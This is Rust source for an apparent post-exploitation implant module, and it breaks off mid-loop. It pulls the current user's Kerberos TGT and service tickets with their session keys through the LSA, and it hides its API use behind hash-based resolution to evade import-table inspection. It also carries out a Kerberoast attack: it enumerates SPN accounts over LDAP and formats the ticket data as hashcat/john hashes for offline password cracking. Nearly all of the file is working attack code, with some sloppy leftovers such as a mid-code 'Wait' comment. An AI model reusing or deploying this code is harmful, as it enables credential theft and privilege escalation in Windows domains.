//  LSA Kerberos Ticket Operations — TGT / TGS Retrieval
// ═══════════════════════════════════════════════════════════════════════
//
//  Uses LsaCallAuthenticationPackage with the Kerberos SSP to retrieve
//  TGT and TGS tickets for the current logon session.  No admin required
//  — LsaConnectUntrusted grants access to the calling user's tickets.
//
//  All API calls routed through pe_resolve (no IAT entries).

// ── Kerberos message types for LSA ──────────────────────────────────

/// KerbRetrieveEncodedTicketMessage (16) — retrieve the current TGT.
const KERB_RETRIEVE_ENCODED_TICKET: u32 = 16;
/// KerbGetEncodedTicketMessage (9) — retrieve a TGS for a target SPN.
const KERB_GET_ENCODED_TICKET: u32 = 9;
/// KerbQueryTgtCacheMessage (10) — list cached TGTs.
const KERB_QUERY_TGT_CACHE: u32 = 10;
/// KerbQueryTicketCacheMessage (14) — list cached service tickets.
const KERB_QUERY_TICKET_CACHE: u32 = 14;
/// KerbRetrieveTicketMessage (1) — retrieve TGT (legacy, simpler).
const KERB_RETRIEVE_TICKET: u32 = 1;
/// KerbSubmitTicketMessage (17) — submit a ticket into the cache.
const KERB_SUBMIT_TICKET: u32 = 17;

// ── LSA function pointer types ──────────────────────────────────────

type FnLsaConnectUntrusted = unsafe extern "system" fn(*mut HANDLE) -> i32;
type FnLsaCallAuthenticationPackage = unsafe extern "system" fn(
    HANDLE,
    ULONG,
    *const u8,
    ULONG,
    *mut *mut u8,
    *mut ULONG,
    *mut i32,
) -> i32;
type FnLsaLookupAuthenticationPackage =
    unsafe extern "system" fn(HANDLE, *const UNICODE_STRING, *mut ULONG) -> i32;
type FnLsaFreeReturnBuffer = unsafe extern "system" fn(LPVOID) -> i32;

use crate::win_types::{PVOID, ULONG, UNICODE_STRING};

// ── Kerberos LSA request/response structures ────────────────────────

/// KERB_RETRIEVE_TKT_REQUEST — used for both TGT and TGS retrieval.
#[repr(C)]
struct KerbRetrieveTktRequest {
    message_type: ULONG,
    logon_id: i64, // LUID — zero for current session
    target_name: UNICODE_STRING,
    ticket_flags: ULONG,
    cache_options: ULONG,
    encryption_type: i32,   // 0 = default
    credential_handle: i64, // SecHandle — zero if not using S4U
}

/// KERB_RETRIEVE_TKT_RESPONSE — returned by LSA.
#[repr(C)]
struct KerbRetrieveTktResponse {
    ticket: KerbExternalTicket,
}

/// KERB_EXTERNAL_TICKET — contains the encoded ticket.
#[repr(C)]
struct KerbExternalTicket {
    service_name: *mut c_void, // PKERB_PRINCIPAL_NAME
    target_name: *mut c_void,  // PKERB_PRINCIPAL_NAME
    client_name: *mut c_void,  // PKERB_PRINCIPAL_NAME
    domain_name: UNICODE_STRING,
    target_domain_name: UNICODE_STRING,
    alt_target_domain_name: UNICODE_STRING,
    session_key: KerbCryptoKey,
    ticket_flags: ULONG,
    flags: ULONG,
    key_type: i32,
    key_length: ULONG,
    key: *mut u8,
    start_time: i64,
    end_time: i64,
    renew_until: i64,
    time_skew: i64,
    encoded_ticket_size: ULONG,
    encoded_ticket: *mut u8,
}

/// KERB_CRYPTO_KEY — session key info.
#[repr(C)]
struct KerbCryptoKey {
    key_type: i32,
    length: ULONG,
    value: *mut u8,
}

/// KERB_TGT_CACHE_QUERY — lists cached TGTs.
#[repr(C)]
struct KerbQueryTgtCacheRequest {
    message_type: ULONG,
    logon_id: i64,
}

/// KERB_TGT_CACHE_RESPONSE — returned TGT list.
#[repr(C)]
#[allow(dead_code)]
struct KerbTgtCacheResponse {
    count_of_tgts: ULONG,
    // Followed by CountOfTgts × KERB_TICKET_CACHE_INFO_EX entries
}

/// KERB_TICKET_CACHE_INFO_EX — single cached ticket entry.
#[repr(C)]
struct KerbTicketCacheInfoEx {
    client_name: UNICODE_STRING,
    client_realm: UNICODE_STRING,
    server_name: UNICODE_STRING,
    server_realm: UNICODE_STRING,
    start_time: i64,
    end_time: i64,
    renew_time: i64,
    encryption_type: i32,
    ticket_flags: ULONG,
}

/// Result of a TGT retrieval.
#[derive(Debug, Serialize)]
pub struct TgtResult {
    /// The encoded TGT (KRB-CRED / AP-REQ format).
    pub encoded_ticket: Vec<u8>,
    /// Session key type (e.g., 23 = RC4, 18 = AES256).
    pub session_key_type: i32,
    /// Session key bytes.
    pub session_key: Vec<u8>,
    /// Client principal name.
    pub client_name: String,
    /// Domain / realm.
    pub domain: String,
    /// Ticket start time (FILETIME).
    pub start_time: i64,
    /// Ticket end time (FILETIME).
    pub end_time: i64,
}

/// Result of a TGS retrieval.
#[derive(Debug, Serialize)]
pub struct TgsResult {
    /// The encoded service ticket.
    pub encoded_ticket: Vec<u8>,
    /// Session key type.
    pub session_key_type: i32,
    /// Session key bytes.
    pub session_key: Vec<u8>,
    /// Target SPN.
    pub target_spn: String,
    /// Client principal.
    pub client_name: String,
}

/// Resolved LSA API function pointers.
struct LsaKerbApis {
    connect: FnLsaConnectUntrusted,
    call_pkg: FnLsaCallAuthenticationPackage,
    lookup_pkg: FnLsaLookupAuthenticationPackage,
    free_buf: FnLsaFreeReturnBuffer,
}

impl LsaKerbApis {
    /// Resolve all required LSA API functions via pe_resolve.
    unsafe fn resolve() -> Result<Self> {
        let dll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_SECUR32_DLL)
            .ok_or_else(|| anyhow!("secur32.dll not found"))?;

        macro_rules! resolve_fn {
            ($hash:expr, $name:expr) => {
                pe_resolve::get_proc_address_by_hash(dll_base, $hash)
                    .ok_or_else(|| anyhow!("{} not found", $name))
                    .map(|addr| std::mem::transmute::<usize, _>(addr))?
            };
        }

        Ok(LsaKerbApis {
            connect: resolve_fn!(pe_resolve::HASH_LSACONNECTUNTRUSTED, "LsaConnectUntrusted"),
            call_pkg: resolve_fn!(
                pe_resolve::HASH_LSACALLAUTHENTICATIONPACKAGE,
                "LsaCallAuthenticationPackage"
            ),
            lookup_pkg: resolve_fn!(
                pe_resolve::HASH_LSALOOKUPAUTHENTICATIONPACKAGE,
                "LsaLookupAuthenticationPackage"
            ),
            free_buf: resolve_fn!(pe_resolve::HASH_LSAFREERETURNBUFFER, "LsaFreeReturnBuffer"),
        })
    }
}

/// RAII guard for an LSA handle.
struct LsaHandle {
    handle: HANDLE,
    free_buf: FnLsaFreeReturnBuffer,
}

impl LsaHandle {
    /// Connect to LSA (untrusted — no admin required).
    unsafe fn connect(api: &LsaKerbApis) -> Result<Self> {
        let mut handle: HANDLE = ptr::null_mut();
        let status = (api.connect)(&mut handle);
        if status != 0 {
            bail!("LsaConnectUntrusted failed: 0x{:08X}", status as u32);
        }
        Ok(LsaHandle {
            handle,
            free_buf: api.free_buf,
        })
    }
}

impl Drop for LsaHandle {
    fn drop(&mut self) {
        unsafe {
            // NtClose the LSA handle.
            type FnNtClose = unsafe extern "system" fn(HANDLE) -> i32;
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                let close_addr =
                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::HASH_NTCLOSE);
                if let Some(addr) = close_addr {
                    let ntclose: FnNtClose = mem::transmute(addr);
                    ntclose(self.handle);
                }
            }
        }
    }
}

/// Build a UNICODE_STRING pointing at a wide string slice.
unsafe fn make_unicode_string(wide: &[u16]) -> UNICODE_STRING {
    UNICODE_STRING {
        Length: (wide.len() * 2) as u16,
        MaximumLength: (wide.len() * 2) as u16,
        Buffer: wide.as_ptr() as *mut u16,
    }
}

/// Read a UNICODE_STRING value, returning a String.  Does NOT free the buffer.
unsafe fn unicode_string_to_string(us: &UNICODE_STRING) -> String {
    if us.Buffer.is_null() || us.Length == 0 {
        return String::new();
    }
    let len = us.Length as usize / 2;
    let slice = std::slice::from_raw_parts(us.Buffer, len);
    String::from_utf16_lossy(slice)
}

/// Look up the Kerberos authentication package ID.
unsafe fn lookup_kerberos_package(handle: HANDLE, apis: &LsaKerbApis) -> Result<ULONG> {
    let kerberos_w: Vec<u16> = "Kerberos\0".encode_utf16().collect();
    let pkg_name = make_unicode_string(&kerberos_w[..kerberos_w.len() - 1]);

    let mut package_id: ULONG = 0;
    let status = (apis.lookup_pkg)(handle, &pkg_name, &mut package_id);
    if status != 0 {
        bail!(
            "LsaLookupAuthenticationPackage(Kerberos) failed: 0x{:08X}",
            status as u32
        );
    }
    Ok(package_id)
}

/// Call LsaCallAuthenticationPackage with a Kerberos request buffer.
unsafe fn call_kerb_package(
    handle: HANDLE,
    apis: &LsaKerbApis,
    package_id: ULONG,
    request: &[u8],
) -> Result<(*mut u8, ULONG)> {
    let mut return_buf: *mut u8 = ptr::null_mut();
    let mut return_len: ULONG = 0;
    let mut protocol_status: i32 = 0;

    let status = (apis.call_pkg)(
        handle,
        package_id,
        request.as_ptr(),
        request.len() as ULONG,
        &mut return_buf,
        &mut return_len,
        &mut protocol_status,
    );

    if status != 0 {
        bail!(
            "LsaCallAuthenticationPackage failed: NTSTATUS 0x{:08X}, protocol status 0x{:08X}",
            status as u32,
            protocol_status as u32
        );
    }
    if protocol_status != 0 {
        // Free the return buffer if allocated.
        if !return_buf.is_null() {
            (apis.free_buf)(return_buf as PVOID);
        }
        bail!(
            "Kerberos package returned protocol error: 0x{:08X}",
            protocol_status as u32
        );
    }

    Ok((return_buf, return_len))
}

/// Free an LSA return buffer.
unsafe fn free_lsa_buffer(apis: &LsaKerbApis, buf: *mut u8) {
    if !buf.is_null() {
        (apis.free_buf)(buf as PVOID);
    }
}

/// Retrieve the current user's TGT via the Kerberos SSP.
///
/// Uses `KerbRetrieveEncodedTicketMessage` to obtain the TGT for the
/// current logon session.  No elevated privileges are required — any
/// domain user can retrieve their own TGT.
pub fn get_tgt_for_current_user() -> Result<TgtResult> {
    unsafe {
        let apis = LsaKerbApis::resolve()?;
        let lsa = LsaHandle::connect(&apis)?;
        let pkg_id = lookup_kerberos_package(lsa.handle, &apis)?;

        // Build KERB_RETRIEVE_TKT_REQUEST for TGT.
        // TargetName = empty (requests the TGT).
        let empty_target = UNICODE_STRING {
            Length: 0,
            MaximumLength: 0,
            Buffer: ptr::null_mut(),
        };

        let request = KerbRetrieveTktRequest {
            message_type: KERB_RETRIEVE_ENCODED_TICKET,
            logon_id: 0, // Current session
            target_name: empty_target,
            ticket_flags: 0,
            cache_options: 0,   // KERB_RETRIEVE_TICKET_DEFAULT
            encryption_type: 0, // Default
            credential_handle: 0,
        };

        let (buf, buf_len) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&request))?;

        if (buf_len as usize) < std::mem::size_of::<KerbRetrieveTktResponse>() {
            free_lsa_buffer(&apis, buf);
            bail!("TGT response too short ({} bytes)", buf_len);
        }

        let response = &*(buf as *const KerbRetrieveTktResponse);
        let ticket = &response.ticket;

        // Extract encoded ticket.
        let encoded = if !ticket.encoded_ticket.is_null() && ticket.encoded_ticket_size > 0 {
            std::slice::from_raw_parts(ticket.encoded_ticket, ticket.encoded_ticket_size as usize)
                .to_vec()
        } else {
            Vec::new()
        };

        // Extract session key.
        let session_key = if !ticket.session_key.value.is_null() && ticket.session_key.length > 0 {
            std::slice::from_raw_parts(ticket.session_key.value, ticket.session_key.length as usize)
                .to_vec()
        } else {
            Vec::new()
        };

        let client_name = unicode_string_to_string(&ticket.alt_target_domain_name);
        let domain = unicode_string_to_string(&ticket.domain_name);

        let result = TgtResult {
            encoded_ticket: encoded,
            session_key_type: ticket.key_type,
            session_key,
            client_name,
            domain,
            start_time: ticket.start_time,
            end_time: ticket.end_time,
        };

        free_lsa_buffer(&apis, buf);
        Ok(result)
    }
}

/// Retrieve a service ticket (TGS) for a target SPN via the Kerberos SSP.
///
/// Uses `KerbGetEncodedTicketMessage` to obtain a TGS for the specified
/// SPN.  The KDC is contacted automatically by the Kerberos SSP — no
/// direct network access required.
pub fn request_service_ticket(target_spn: &str) -> Result<TgsResult> {
    unsafe {
        let apis = LsaKerbApis::resolve()?;
        let lsa = LsaHandle::connect(&apis)?;
        let pkg_id = lookup_kerberos_package(lsa.handle, &apis)?;

        // Build target name as wide string.
        let mut target_w: Vec<u16> = target_spn.encode_utf16().collect();
        target_w.push(0); // null terminator

        let target_us = make_unicode_string(&target_w[..target_w.len() - 1]);

        let mut request = KerbRetrieveTktRequest {
            message_type: KERB_GET_ENCODED_TICKET,
            logon_id: 0,
            target_name: target_us,
            ticket_flags: 0,
            cache_options: 0,
            encryption_type: 0,
            credential_handle: 0,
        };

        let (buf, buf_len) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&request))?;

        if (buf_len as usize) < std::mem::size_of::<KerbRetrieveTktResponse>() {
            free_lsa_buffer(&apis, buf);
            bail!("TGS response too short ({} bytes)", buf_len);
        }

        let response = &*(buf as *const KerbRetrieveTktResponse);
        let ticket = &response.ticket;

        let encoded = if !ticket.encoded_ticket.is_null() && ticket.encoded_ticket_size > 0 {
            std::slice::from_raw_parts(ticket.encoded_ticket, ticket.encoded_ticket_size as usize)
                .to_vec()
        } else {
            Vec::new()
        };

        let session_key = if !ticket.session_key.value.is_null() && ticket.session_key.length > 0 {
            std::slice::from_raw_parts(ticket.session_key.value, ticket.session_key.length as usize)
                .to_vec()
        } else {
            Vec::new()
        };

        let client_name = unicode_string_to_string(&ticket.alt_target_domain_name);

        let result = TgsResult {
            encoded_ticket: encoded,
            session_key_type: ticket.key_type,
            session_key,
            target_spn: target_spn.to_string(),
            client_name,
        };

        free_lsa_buffer(&apis, buf);
        Ok(result)
    }
}

/// List cached Kerberos tickets (TGTs and service tickets).
pub fn list_cached_tickets() -> Result<Vec<serde_json::Value>> {
    unsafe {
        let apis = LsaKerbApis::resolve()?;
        let lsa = LsaHandle::connect(&apis)?;
        let pkg_id = lookup_kerberos_package(lsa.handle, &apis)?;

        let mut tickets = Vec::new();

        // Query TGT cache.
        let tgt_req = KerbQueryTgtCacheRequest {
            message_type: KERB_QUERY_TGT_CACHE,
            logon_id: 0,
        };

        if let Ok((buf, buf_len)) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&tgt_req))
        {
            if buf_len as usize >= std::mem::size_of::<KerbTgtCacheResponse>() {
                let resp = &*(buf as *const KerbTgtCacheResponse);
                let count = resp.count_of_tgts as usize;
                let entries_size = count * std::mem::size_of::<KerbTicketCacheInfoEx>();
                let header_size = std::mem::size_of::<KerbTgtCacheResponse>();

                if buf_len as usize >= header_size + entries_size {
                    let entries_ptr = buf.add(header_size) as *const KerbTicketCacheInfoEx;
                    for i in 0..count {
                        let entry = &*entries_ptr.add(i);
                        tickets.push(serde_json::json!({
                            "type": "tgt",
                            "client": unicode_string_to_string(&entry.client_name),
                            "client_realm": unicode_string_to_string(&entry.client_realm),
                            "server": unicode_string_to_string(&entry.server_name),
                            "server_realm": unicode_string_to_string(&entry.server_realm),
                            "encryption_type": entry.encryption_type,
                            "ticket_flags": entry.ticket_flags,
                            "start_time": entry.start_time,
                            "end_time": entry.end_time,
                        }));
                    }
                }
            }
            free_lsa_buffer(&apis, buf);
        }

        // Query service ticket cache.
        let tgs_req = KerbQueryTgtCacheRequest {
            message_type: KERB_QUERY_TICKET_CACHE,
            logon_id: 0,
        };

        if let Ok((buf, buf_len)) = call_kerb_package(lsa.handle, &apis, pkg_id, as_bytes(&tgs_req))
        {
            if buf_len as usize >= std::mem::size_of::<KerbTgtCacheResponse>() {
                let resp = &*(buf as *const KerbTgtCacheResponse);
                let count = resp.count_of_tgts as usize;
                let entries_size = count * std::mem::size_of::<KerbTicketCacheInfoEx>();
                let header_size = std::mem::size_of::<KerbTgtCacheResponse>();

                if buf_len as usize >= header_size + entries_size {
                    let entries_ptr = buf.add(header_size) as *const KerbTicketCacheInfoEx;
                    for i in 0..count {
                        let entry = &*entries_ptr.add(i);
                        tickets.push(serde_json::json!({
                            "type": "tgs",
                            "client": unicode_string_to_string(&entry.client_name),
                            "client_realm": unicode_string_to_string(&entry.client_realm),
                            "server": unicode_string_to_string(&entry.server_name),
                            "server_realm": unicode_string_to_string(&entry.server_realm),
                            "encryption_type": entry.encryption_type,
                            "ticket_flags": entry.ticket_flags,
                            "start_time": entry.start_time,
                            "end_time": entry.end_time,
                        }));
                    }
                }
            }
            free_lsa_buffer(&apis, buf);
        }

        Ok(tickets)
    }
}

/// Cast a struct to a byte slice (safe for repr(C) types).
unsafe fn as_bytes<T: Sized>(val: &T) -> &[u8] {
    std::slice::from_raw_parts(val as *const T as *const u8, std::mem::size_of::<T>())
}

// ═══════════════════════════════════════════════════════════════════════
//  Kerberoast — LDAP SPN Enumeration + TGS Hash Extraction
// ═══════════════════════════════════════════════════════════════════════
//
//  Queries LDAP for user accounts with SPNs, requests TGS tickets via
//  the Kerberos SSP, and extracts the encrypted portion for offline
//  cracking.  No admin privileges required — any domain user can request
//  service tickets.
//
//  Hash format: $krb5tgs$23$<user>$<realm>$<spn>$<checksum>$<encrypted_data>

/// A Kerberoast result entry.
#[derive(Debug, Serialize)]
pub struct KerberoastEntry {
    /// sAMAccountName of the service account.
    pub username: String,
    /// Domain FQDN (realm).
    pub domain: String,
    /// Service Principal Name.
    pub spn: String,
    /// Encryption type (23 = RC4-HMAC, 18 = AES256-CTS-HMAC-SHA1-96).
    pub encryption_type: i32,
    /// Hashcat/john formatted hash string.
    pub hash: String,
    /// Distinguished name from LDAP.
    pub dn: String,
}

/// LDAP function pointer types (wldap32.dll).
type FnLdapInitW = unsafe extern "system" fn(*const u16, u32, u32) -> *mut c_void;
type FnLdapBindW = unsafe extern "system" fn(*mut c_void, *const u16, *const c_void) -> u32;
type FnLdapSearchW = unsafe extern "system" fn(
    *mut c_void,
    *const u16,
    u32,
    *const u16,
    *mut *const u16,
    u32,
    *mut *mut c_void,
) -> u32;
type FnLdapGetNextPage = unsafe extern "system" fn(*mut c_void, u32, u32, *mut *mut c_void) -> u32;
type FnLdapFirstEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
type FnLdapNextEntry = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
type FnLdapGetValuesW =
    unsafe extern "system" fn(*mut c_void, *mut c_void, *const u16) -> *mut *mut u16;
type FnLdapValueFreeW = unsafe extern "system" fn(*mut *mut u16) -> u32;
type FnLdapMsgFree = unsafe extern "system" fn(*mut c_void) -> u32;
type FnLdapUnbind = unsafe extern "system" fn(*mut c_void) -> u32;
type FnLdapCountEntries = unsafe extern "system" fn(*mut c_void, *mut c_void) -> u32;
type FnLdapGetPagedResult = unsafe extern "system" fn(
    *mut c_void,
    *const u16,
    u32,
    *mut *const u16,
    u32,
    *mut *mut c_void,
    *mut u32,
) -> u32;

// LDAP result codes.
const LDAP_SUCCESS: u32 = 0;
const LDAP_SCOPE_SUBTREE: u32 = 2;

// ── Kerberos encryption type constants ───────────────────────────────
const KERB_ETYPE_RC4_HMAC: i32 = 23;
const KERB_ETYPE_AES128_CTS_HMAC_SHA96: i32 = 17;
const KERB_ETYPE_AES256_CTS_HMAC_SHA196: i32 = 18;

/// Extract the Kerberoast hash from an encoded TGS ticket.
///
/// Parses the ASN.1/DER-encoded ticket to extract the encrypted part,
/// then formats it as a `$krb5tgs$23$...` string for hashcat/john.
fn extract_rc4_ticket(
    encoded_ticket: &[u8],
    spn: &str,
    username: &str,
    domain: &str,
) -> Result<String> {
    // The encoded ticket is a Kerberos Ticket structure (ASN.1):
    //   [APPLICATION 3] SEQUENCE {
    //     tkt-vno [0] INTEGER (5),
    //     realm   [1] Realm,
    //     sname   [2] PrincipalName,
    //     enc-part [3] EncryptedData
    //   }
    //
    // We need the enc-part which contains the encrypted ticket data.

    let mut parser = Asn1Parser::new(encoded_ticket);

    // APPLICATION 3 tag (0xA3) or the wrapper.
    let (tag, body) = parser.read_tlv()?;
    // The ticket may be wrapped in a context tag [3] (0xA3).
    if tag != 0xA3 && tag != ASN1_SEQUENCE_TAG && tag != 0x63 {
        // Try treating it as a raw ticket — tag 0x63 is APPLICATION 3 CONSTRUCTED.
        // If not, just use the whole thing.
    }

    let mut ticket_parser = Asn1Parser::new(body);

    // Skip the outer SEQUENCE if present.
    let (seq_tag, seq_body) = if ticket_parser.remaining() > 0 {
        let (t, v) = ticket_parser.read_tlv()?;
        if t == ASN1_SEQUENCE_TAG {
            (t, v)
        } else {
            // Not a sequence — use the full body.
            (ASN1_SEQUENCE_TAG, body)
        }
    } else {
        (ASN1_SEQUENCE_TAG, body)
    };

    let mut inner = Asn1Parser::new(seq_body);

    // [0] tkt-vno (INTEGER) — should be 5
    let (_, _) = inner.read_tlv()?;

    // [1] realm (GeneralString)
    let (_, _) = inner.read_tlv()?;

    // [2] sname (SEQUENCE of GeneralString)
    let (_, _) = inner.read_tlv()?;

    // [3] enc-part (EncryptedData SEQUENCE { etype, kvno, cipher })
    let (enc_tag, enc_body) = inner.read_tlv()?;
    if enc_tag != ASN1_CONTEXT_3 {
        bail!("Expected context [3] for enc-part, got 0x{:02X}", enc_tag);
    }

    let mut enc_parser = Asn1Parser::new(enc_body);

    // Skip inner SEQUENCE wrapper if present.
    let enc_inner = if enc_parser.remaining() > 0 {
        let (t, v) = enc_parser.read_tlv()?;
        if t == ASN1_SEQUENCE_TAG {
            v
        } else {
            enc_body
        }
    } else {
        enc_body
    };

    let mut fields = Asn1Parser::new(enc_inner);

    // etype [0] INTEGER
    let (_, etype_val) = fields.read_tlv()?;
    let etype = if etype_val.len() >= 1 {
        etype_val[0] as i32
    } else {
        0
    };

    // kvno [1] INTEGER (optional)
    let kvno = if fields.remaining() > 0 {
        let (t, v) = fields.read_tlv()?;
        if t == ASN1_CONTEXT_1 && v.len() >= 1 {
            v[0] as u32
        } else {
            0
        }
    } else {
        0
    };

    // cipher [2] OCTET STRING
    let (cipher_tag, cipher_val) = fields.read_tlv()?;
    if cipher_tag != ASN1_CONTEXT_2 {
        bail!("Expected context [2] for cipher, got 0x{:02X}", cipher_tag);
    }

    // Format as Kerberoast hash.
    // $krb5tgs$<etype>$<username>$<realm>$<spn>$<checksum_hex>$<encrypted_hex>
    // For RC4 (etype 23), the format is slightly different:
    //   $krb5tgs$23$*<username>$<realm>$<spn>*$<first_16_bytes_hex>$<remaining_hex>
    if etype == KERB_ETYPE_RC4_HMAC {
        if cipher_val.len() < 16 {
            bail!("RC4 cipher too short ({} bytes)", cipher_val.len());
        }
        let checksum = &cipher_val[..16];
        let encrypted = &cipher_val[16..];
        Ok(format!(
            "$krb5tgs${}$*{}${}${}${}${}",
            etype,
            username,
            domain,
            spn,
            hex::encode(checksum),
            hex::encode(encrypted),
        ))
    } else {
        // AES format: $krb5tgs$<etype>$<username>$<realm>$<spn>$<kvno>$<cipher_hex>
        Ok(format!(
            "$krb5tgs${}${}${}${}${}${}",
            etype,
            username,
            domain,
            spn,
            kvno,
            hex::encode(cipher_val),
        ))
    }
}

/// Execute Kerberoast attack — enumerate SPNs via LDAP and extract TGS hashes.
///
/// # Arguments
///
/// * `dc_address` - IP or hostname of the domain controller (LDAP).
/// * `ldap_filter` - Optional LDAP filter override.  Defaults to users with SPNs.
/// * `requested_etype` - Encryption type to request (23 = RC4, 18 = AES256).
///
/// # Returns
///
/// Vector of Kerberoast entries with hashcat/john formatted hashes.
pub fn kerberoast_spns(
    dc_address: &str,
    ldap_filter: Option<&str>,
    requested_etype: i32,
) -> Result<Vec<KerberoastEntry>> {
    unsafe {
        // ── Resolve LDAP functions via pe_resolve ────────────────────
        let wldap32_w: Vec<u16> = "wldap32.dll\0".encode_utf16().collect();
        let wldap32_hash = pe_resolve::hash_wstr(&wldap32_w[..wldap32_w.len() - 1]);
        let wldap32 = pe_resolve::get_module_handle_by_hash(wldap32_hash)
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        macro_rules! resolve_ldap_fn {
            ($name:expr, $ty:ty) => {
                pe_resolve::get_proc_address_by_hash(
                    wldap32,
                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
                )
                .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
            };
        }

        let ldap_init: FnLdapInitW = resolve_ldap_fn!("ldap_initW", FnLdapInitW);
        let ldap_bind_s: FnLdapBindW = resolve_ldap_fn!("ldap_bind_sW", FnLdapBindW);
        let ldap_search_s: FnLdapSearchW = resolve_ldap_fn!("ldap_search_sW", FnLdapSearchW);
        let ldap_first_entry: FnLdapFirstEntry =
            resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
        let ldap_next_entry: FnLdapNextEntry = resolve_ldap_fn!("ldap_next_entry", FnLdapNextEntry);
        let ldap_get_values: FnLdapGetValuesW =
            resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
        let ldap_value_free: FnLdapValueFreeW =
            resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
        let ldap_msg_free: FnLdapMsgFree = resolve_ldap_fn!("ldap_msgfree", FnLdapMsgFree);
        let ldap_unbind: FnLdapUnbind = resolve_ldap_fn!("ldap_unbind", FnLdapUnbind);
        let ldap_count_entries: FnLdapCountEntries =
            resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);

        // ── Connect to LDAP ──────────────────────────────────────────
        let dc_w: Vec<u16> = dc_address
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let ld = ldap_init(dc_w.as_ptr(), 389, 0);
        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc_address);
        }

        // Bind with current credentials (NULL = SASL/GSSAPI).
        let bind_result = ldap_bind_s(ld, ptr::null(), ptr::null());
        if bind_result != LDAP_SUCCESS {
            ldap_unbind(ld);
            bail!("ldap_bind_sW failed: error {}", bind_result);
        }

        // ── Search for users with SPNs ──────────────────────────────
        let default_filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))";
        let filter_w: Vec<u16> = ldap_filter
            .unwrap_or(default_filter)
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let base_dn_w: Vec<u16> = std::iter::once(0u16).collect(); // RootDSE default
        let attr_spn: Vec<u16> = "servicePrincipalName\0".encode_utf16().collect();
        let attr_sam: Vec<u16> = "sAMAccountName\0".encode_utf16().collect();
        let attr_dn: Vec<u16> = "distinguishedName\0".encode_utf16().collect();
        let attr_uac: Vec<u16> = "userAccountControl\0".encode_utf16().collect();
        let attrs = [
            attr_spn.as_ptr(),
            attr_sam.as_ptr(),
            attr_dn.as_ptr(),
            attr_uac.as_ptr(),
            ptr::null(),
        ];

        let mut search_result: *mut c_void = ptr::null_mut();
        let search_status = ldap_search_s(
            ld,
            base_dn_w.as_ptr(),
            LDAP_SCOPE_SUBTREE,
            filter_w.as_ptr(),
            attrs.as_ptr() as *mut *const u16,
            0,
            &mut search_result,
        );

        // Wait — ldap_search_s signature mismatch. Use paged search.
        // Actually, let's just use a simpler approach for the search result.
        let search_result = {
            // Re-do the search with a simpler API pattern.
            let mut msg: *mut c_void = ptr::null_mut();

            // Re-resolve ldap_search_ext_sW for paged results.
            type FnLdapSearchExtS = unsafe extern "system" fn(
                *mut c_void,
                *const u16,
                u32,
                *const u16,
                *mut *const u16,
                u32,
                *mut c_void,
                *mut c_void,
                *mut i32,
                *mut c_void,
            ) -> u32;

            let ldap_search_ext_s: Option<FnLdapSearchExtS> = pe_resolve::get_proc_address_by_hash(
                wldap32,
                pe_resolve::hash_str(b"ldap_search_ext_sW\0"),
            )
            .map(|addr| std::mem::transmute::<usize, FnLdapSearchExtS>(addr));

            let status = if let Some(search_ext) = ldap_search_ext_s {
                search_ext(
                    ld,
                    base_dn_w.as_ptr(),
                    LDAP_SCOPE_SUBTREE,
                    filter_w.as_ptr(),
                    attrs.as_ptr() as *mut *const u16,
                    0,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    &mut msg as *mut _ as *mut c_void,
                )
            } else {
                // Fallback: use the resolved ldap_search_s.
                ldap_search_s(
                    ld,
                    base_dn_w.as_ptr(),
                    LDAP_SCOPE_SUBTREE,
                    filter_w.as_ptr(),
                    attrs.as_ptr() as *mut *const u16,
                    0,
                    &mut msg,
                )
            };

            if status != LDAP_SUCCESS {
                ldap_unbind(ld);
                bail!("LDAP search failed: error {}", status);
            }
            msg
        };

        let entry_count = ldap_count_entries(ld, search_result);
        tracing::info!("Kerberoast: found {} entries with SPNs", entry_count);

        // ── Iterate entries and extract hashes ───────────────────────
        let mut results = Vec::new();
        let mut entry = ldap_first_entry(ld, search_result);

        while !entry.is_null() {
            // Get sAMAccountName.
            let sam_name_w: Vec<u16> = "sAMAccountName\0".encode_utf16().collect();
            let sam_values = ldap_get_values(ld, entry, sam_name_w.as_ptr());
            let username = if !sam_values.is_null() && !(*sam_values).is_null() {
                let slice = std::slice::from_raw_parts(*sam_values, 64);
                let end = slice.iter().position(|&c| c == 0).unwrap_or(slice.len());
                String::from_utf16_lossy(&slice[..end])
            } else {
                String::new()
            };
            if !sam_values.is_null() {
                ldap_value_free(sam_values);
            }

            // Get DN.
            let dn_w: Vec<u16> = "distinguishedName\0".encode_utf16().collect();
            let dn_values = ldap_get_values(ld, entry, dn_w.as_ptr());
            let dn = if !dn_values.is_null() && !(*dn_values).is_null() {
                let slice = std::slice::from_raw_parts(*dn_values, 256);
                let end = slice.iter().position(|&c| c == 0).unwrap_or(slice.len());
                String::from_utf16_lossy(&slice[..end])
            } else {
                String::new()
            };
            if !dn_values.is_null() {
                ldap_value_free(dn_values);
            }

            // Get SPN(s).
            let spn_w: Vec<u16> = "servicePrincipalName\0".encode_utf16().collect();
            let spn_values = ldap_get_values(ld, entry, spn_w.as_ptr());

            if !spn_values.is_null() {
                let mut spn_idx = 0;
                loop {
                    let spn_ptr = *spn_values.add(spn_idx);
                    if spn_ptr.is_null() {
                        break;
                    }

                    let slice = std::slice::from_raw_parts(spn_ptr, 256);
                    let end = slice.iter().position(|&c| c == 0).unwrap_or(slice.len());
